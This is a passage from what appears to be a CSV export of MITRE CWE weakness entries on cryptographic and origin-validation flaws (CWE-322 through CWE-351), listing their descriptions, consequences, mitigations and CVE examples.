4.1B::\",::102::117::383::477::65::,\"::TYPE:Maintenance:NOTE:The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the Mapping CWE to 62443 subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.::\",\n322,\"Key Exchange without Entity Authentication\",Base,Draft,\"The product performs a key exchange with an actor without verifying the identity of that actor.\",\"Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable an attacker to impersonate an actor by modifying traffic between the two entities. Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc.\",::NATURE:ChildOf:CWE ID:306:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:923:VIEW ID:1000::NATURE:PeerOf:CWE ID:295:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:No authentication takes place in this process, bypassing an assumed protection of encryption.::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:The encrypted communication between a user and a trusted host may be subject to sniffing by any actor in the communication path.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure that proper authentication is included in the system design.::PHASE:Implementation:DESCRIPTION:Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Key exchange without entity authentication::\",,\"\",\n323,\"Reusing a Nonce, Key Pair in Encryption\",Base,Incomplete,\"Nonces should be used for the present occasion and only once.\",\"\",::NATURE:ChildOf:CWE ID:344:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"::Nonces are often bundled with a key in a communication exchange to produce a new session key for each exchange.::\",\"\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:Potentially a replay attack, in which an attacker could send the same data twice, could be crafted if nonces are allowed to be reused. This could allow a user to send a message which masquerades as a valid message from a valid user.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Refuse to reuse nonce values.::PHASE:Implementation:DESCRIPTION:Use techniques such as requiring incrementing, time based and/or challenge response to assure uniqueness of nonces.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Reusing a nonce, key pair in encryption::\",,\"\",\n324,\"Use of a Key Past its Expiration Date\",Base,Draft,\"The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.\",\"While the expiration of keys does not necessarily ensure that they are compromised, it is a significant concern that keys which remain in use for prolonged periods of time have a decreasing probability of integrity. For this reason, it is important to replace keys within a period of time proportional to their strength.\",::NATURE:ChildOf:CWE ID:672:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:298:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:The cryptographic key in question may be compromised, providing a malicious user with a method for authenticating as the victim.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Adequate consideration should be put in to the user interface in order to notify users previous to the key's expiration, to explain the importance of new key generation and to walk users through the process as painlessly as possible.::\",\"::REFERENCE:CVE-2021-33020:DESCRIPTION:Picture Archiving and Communication System (PACS) system for hospitals uses a cryptographic key or password past its expiration date:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33020::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Using a key past its expiration date::\",,\"\",\n325,\"Missing Cryptographic Step\",Base,Draft,\"The product does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by the algorithm.\",\"\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:358:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Developers sometimes omit expensive (resource-intensive) steps in order to improve performance, especially in devices with limited memory or slower CPUs. This step may be taken under a mistaken impression that the step is unnecessary for the cryptographic algorithm.::PHASE:Requirements:NOTE:This issue may happen when the requirements for the cryptographic algorithm are not clearly stated.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::SCOPE:Accountability:SCOPE:Non-Repudiation:IMPACT:Hide Activities::\",\"\",\"\",\"::REFERENCE:CVE-2001-1585:DESCRIPTION:Missing challenge-response step allows authentication bypass using public key.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1585::\",::Cryptography::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Missing Required Cryptographic Step::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A8:ENTRY NAME:Insecure Cryptographic Storage:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A9:ENTRY NAME:Insecure Communications:MAPPING FIT:CWE More Specific::\",::68::,\"::TYPE:Relationship:NOTE:Overlaps incomplete/missing security check.::TYPE:Relationship:NOTE:Can be resultant.::\",\n328,\"Use of Weak Hash\",Base,Draft,\"The product uses an algorithm that produces a digest (output value) that does not meet security expectations for a hash function that allows an adversary to reasonably determine the original input (preimage attack), find another input that can produce the same hash (2nd preimage attack), or find multiple inputs that evaluate to the same hash (birthday attack).\",\"A hash function is defined as an algorithm that maps arbitrarily sized data into a fixed-sized digest (output) such that the following properties hold: The algorithm is not invertible (also called one-way or not reversible) The algorithm is deterministic; the same input produces the same digest every time Building on this definition, a cryptographic hash function must also ensure that a malicious actor cannot leverage the hash function to have a reasonable chance of success at determining any of the following: the original input (preimage attack), given only the digest another input that can produce the same digest (2nd preimage attack), given the original input a set of two or more inputs that evaluate to the same digest (birthday attack), given the actor can arbitrarily choose the inputs to be hashed and can do so a reasonable amount of times What is regarded as reasonable varies by context and threat model, but in general, reasonable could cover any attack that is more efficient than brute force (i.e., on average, attempting half of all possible combinations). Note that some attacks might be more efficient than brute force but are still not regarded as achievable in the real world. Any algorithm that does not meet the above conditions will generally be considered weak for general use in hashing. In addition to algorithmic weaknesses, a hash function can be made weak by using the hash in a security context that breaks its security guarantees. For example, using a hash function without a salt for storing passwords (that are sufficiently short) could enable an adversary to create a rainbow table [REF-637] to recover the password under certain conditions; this attack works against such hash functions as MD5, SHA-1, and SHA-2.\",::NATURE:ChildOf:CWE ID:326:VIEW ID:1000::NATURE:ChildOf:CWE ID:327:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (stretching) or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use. Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead. Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2022-30320:DESCRIPTION:Programmable Logic Controller (PLC) uses a protocol with a cryptographically insecure hashing algorithm for passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30320::REFERENCE:CVE-2005-4900:DESCRIPTION:SHA-1 algorithm is not collision-resistant.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4900::REFERENCE:CVE-2020-25685:DESCRIPTION:DNS product uses a weak hash (CRC32 or SHA-1) of the query name, allowing attacker to forge responses by computing domain names with the same hash.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-25685::REFERENCE:CVE-2012-6707:DESCRIPTION:blogging product uses MD5-based algorithm for passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-6707::REFERENCE:CVE-2019-14855:DESCRIPTION:forging of certificate signatures using SHA-1 collisions.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-14855::REFERENCE:CVE-2017-15999:DESCRIPTION:mobile app for backup sends SHA-1 hash of password in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-15999::REFERENCE:CVE-2006-4068:DESCRIPTION:Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4068::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Reversible One-Way Hash::\",::461::68::,\"::TYPE:Maintenance:NOTE:Since CWE 4.4, various cryptography-related entries including CWE-328 have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.::\",\n331,\"Insufficient Entropy\",Base,Draft,\"The product uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others.\",\"\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:330:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Other:NOTE:An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Determine the necessary entropy to adequately provide for randomness and predictability. This can be achieved by increasing the number of bits of objects such as keys and seeds.::\",\"::REFERENCE:CVE-2001-0950:DESCRIPTION:Insufficiently random data used to generate session tokens using C rand(). Also, for certificate/key generation, uses a source that does not block when entropy is low.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0950::REFERENCE:CVE-2008-2108:DESCRIPTION:Chain: insufficient precision (CWE-1339) in random-number generator causes some zero bits to be reliably generated, reducing the amount of entropy (CWE-331):LINK:https://www.cve.org/CVERecord?id=CVE-2008-2108::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insufficient Entropy::TAXONOMY NAME:WASC:ENTRY ID:11:ENTRY NAME:Brute Force::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC32-C:ENTRY NAME:Properly seed pseudorandom number generators:MAPPING FIT:Exact::\",::59::,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n334,\"Small Space of Random Values\",Base,Draft,\"The number of possible random values is smaller than needed by the product, making it more susceptible to brute force attacks.\",\"\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Other:NOTE:An attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization.::\",\"\",\"::PHASE:Architecture and Design Requirements:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (Approved Random Number Generators).::\",\"::REFERENCE:CVE-2002-0583:DESCRIPTION:Product uses 5 alphanumeric characters for filenames of expense claim reports, stored under web root.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0583::REFERENCE:CVE-2002-0903:DESCRIPTION:Product uses small number of random numbers for a code to approve an action, and also uses predictable new user IDs, allowing attackers to hijack new accounts.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0903::REFERENCE:CVE-2003-1230:DESCRIPTION:SYN cookies implementation only uses 32-bit keys, making it easier to brute force ISN.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1230::REFERENCE:CVE-2004-0230:DESCRIPTION:Complex predictability / randomness (reduced space).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0230::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Small Space of Random Values::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\","
  },
  "doc-e66235f4162d36ef3e8ee36518f9b686": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n342,\"Predictable Exact Value from Previous Values\",Base,Draft,\"An exact value or random number can be precisely predicted by observing previous values.\",\"\",::NATURE:ChildOf:CWE ID:340:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE::DESCRIPTION:Increase the entropy used to seed a PRNG.::PHASE:Architecture and Design Requirements:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (Approved Random Number Generators).::PHASE:Implementation:DESCRIPTION:Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.::\",\"::REFERENCE:CVE-2002-1463:DESCRIPTION:Firewall generates easily predictable initial sequence numbers (ISN), which allows remote attackers to spoof connections.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1463::REFERENCE:CVE-1999-0074:DESCRIPTION:Listening TCP ports are sequentially allocated, allowing spoofing attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0074::REFERENCE:CVE-1999-0077:DESCRIPTION:Predictable TCP sequence numbers allow spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0077::REFERENCE:CVE-2000-0335:DESCRIPTION:DNS resolver uses predictable IDs, allowing a local user to spoof DNS query results.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0335::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Predictable Exact Value from Previous Values::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n343,\"Predictable Value Range from Previous Values\",Base,Draft,\"The product's random number generator produces a series of values which, when observed, can be used to infer a relatively small range of possibilities for the next value that could be generated.\",\"The output of a random number generator should not be predictable based on observations of previous values. In some cases, an attacker cannot predict the exact value that will be produced next, but can narrow down the possibilities significantly. This reduces the amount of effort to perform a brute force attack. For example, suppose the product generates random numbers between 1 and 100, but it always produces a larger value until it reaches 100. If the generator produces an 80, then the attacker knows that the next value will be somewhere between 81 and 100. Instead of 100 possibilities, the attacker only needs to consider 20.\",::NATURE:ChildOf:CWE ID:340:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE::DESCRIPTION:Increase the entropy used to seed a PRNG.::PHASE:Architecture and Design Requirements:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (Approved Random Number Generators).::PHASE:Implementation:DESCRIPTION:Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Predictable Value Range from Previous Values::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n344,\"Use of Invariant Value in Dynamically Changing Context\",Base,Draft,\"The product uses a constant value, name, or reference, but this value can (or should) vary across different environments.\",\"\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"\",\"::REFERENCE:CVE-2002-0980:DESCRIPTION:Component for web browser writes an error message to a known location, which can then be referenced by attackers to process HTML/script in a less restrictive context:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0980::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Static Value in Unpredictable Context::\",,\"::TYPE:Relationship:NOTE:overlaps default configuration.::\",\n346,\"Origin Validation Error\",Class,Draft,\"The product does not properly verify that the source of data or communication is valid.\",\"\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:345:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:284:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:NOTE:An attacker can access any functionality that is inadvertently accessible to the source.::\",\"\",\"\",\"::REFERENCE:CVE-2000-1218:DESCRIPTION:DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1218::REFERENCE:CVE-2005-0877:DESCRIPTION:DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0877::REFERENCE:CVE-2001-1452:DESCRIPTION:DNS server caches glue records received from non-delegated name servers:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1452::REFERENCE:CVE-2005-2188:DESCRIPTION:user ID obtained from untrusted source (URL):LINK:https://www.cve.org/CVERecord?id=CVE-2005-2188::REFERENCE:CVE-2003-0174:DESCRIPTION:LDAP service does not verify if a particular attribute was set by the LDAP server:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0174::REFERENCE:CVE-1999-1549:DESCRIPTION:product does not sufficiently distinguish external HTML from internal, potentially dangerous HTML, allowing bypass using special strings in the page title. Overlaps special elements.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1549::REFERENCE:CVE-2003-0981:DESCRIPTION:product records the reverse DNS name of a visitor in the logs, allowing spoofing and resultant XSS.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0981::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Origin Validation Error::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 2.12 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SR-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 2.12 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 3.1 RE(1)::\",::111::141::142::160::21::384::385::386::387::388::510::59::60::75::76::89::,\"::TYPE:Maintenance:NOTE:This entry has some significant overlap with other CWE entries and may need some clarification. See terminology notes.::TYPE:Terminology:NOTE:The Origin Validation Error term was originally used in a 1995 thesis [REF-324]. Although not formally defined, an issue is considered to be an origin validation error if either (1) an object [accepts] input from an unauthorized subject, or (2) the system [fails] to properly or completely authenticate a subject. A later section says that an origin validation error can occur when the system (1) does not properly authenticate a user or process or (2) does not properly authenticate the shared data or libraries. The only example provided in the thesis (covered by OSVDB:57615) involves a setuid program running command-line arguments without dropping privileges. So, this definition (and its examples in the thesis) effectively cover other weaknesses such as CWE-287 (Improper Authentication), CWE-285 (Improper Authorization), and CWE-250 (Execution with Unnecessary Privileges). There appears to be little usage of this term today, except in the SecurityFocus vulnerability database, where the term is used for a variety of issues, including web-browser problems that allow violation of the Same Origin Policy and improper validation of the source of an incoming message.::\",\n347,\"Improper Verification of Cryptographic Signature\",Base,Draft,\"The product does not verify, or incorrectly verifies, the cryptographic signature for data.\",\"\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:345:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Gain Privileges or Assume Identity:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker could gain access to sensitive data and possibly execute unauthorized code.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2002-1796:DESCRIPTION:Does not properly verify signatures for trusted entities.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1796::REFERENCE:CVE-2005-2181:DESCRIPTION:Insufficient verification allows spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2181::REFERENCE:CVE-2005-2182:DESCRIPTION:Insufficient verification allows spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2182::REFERENCE:CVE-2002-1706:DESCRIPTION:Accepts a configuration file without a Message Integrity Check (MIC) signature.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1706::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Improperly Verified Signature::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC06-J:ENTRY NAME:Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.9::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SM-6::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req EDR 3.12::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req NDR 3.12::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req HDR 3.12::\",::463::475::,\"\",\n348,\"Use of Less Trusted Source\",Base,Draft,\"The product has two different sources of the same data or information, but it uses the source that has less support for verification, is less trusted, or is less resistant to attack.\",\"\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:An attacker could utilize the untrusted data source to bypass protection mechanisms and gain access to sensitive data.::\",\"\",\"\",\"::REFERENCE:CVE-2001-0860:DESCRIPTION:Product uses IP address provided by a client, instead of obtaining it from the packet headers, allowing easier spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0860::REFERENCE:CVE-2004-1950:DESCRIPTION:Web product uses the IP address in the X-Forwarded-For HTTP header instead of a server variable that uses the connecting IP address, allowing filter bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1950::REFERENCE:CVE-2001-0908:DESCRIPTION:Product logs IP address specified by the client instead of obtaining it from the packet headers, allowing information hiding.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0908::REFERENCE:CVE-2006-1126:DESCRIPTION:PHP application uses IP address from X-Forwarded-For HTTP header, instead of REMOTE_ADDR.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-1126::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Use of Less Trusted Source::\",::141::142::73::76::85::,\"\",\n349,\"Acceptance of Extraneous Untrusted Data With Trusted Data\",Base,Draft,\"The product, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted.\",\"\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Integrity:IMPACT:Bypass Protection Mechanism:IMPACT:Modify Application Data:NOTE:An attacker could package untrusted data with trusted data to bypass protection mechanisms to gain access to and possibly modify sensitive data.::\",\"\",\"\",\"::REFERENCE:CVE-2002-0018:DESCRIPTION:Does not verify that trusted entity is authoritative for all entities in its response.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0018::REFERENCE:CVE-2006-5462:DESCRIPTION:use of extra data in a signature allows certificate signature forging:LINK:https://www.cve.org/CVERecord?id=CVE-2006-5462::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Untrusted Data Appended with Trusted Data::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ENV01-J:ENTRY NAME:Place all security-sensitive code in a single JAR and sign and seal it::\",::141::142::75::,\"\",\n351,\"Insufficient Type Distinction\",Base,Draft,\"The product does not properly distinguish between different types of elements in a way that leads to insecure behavior.\",\"\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:436:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE 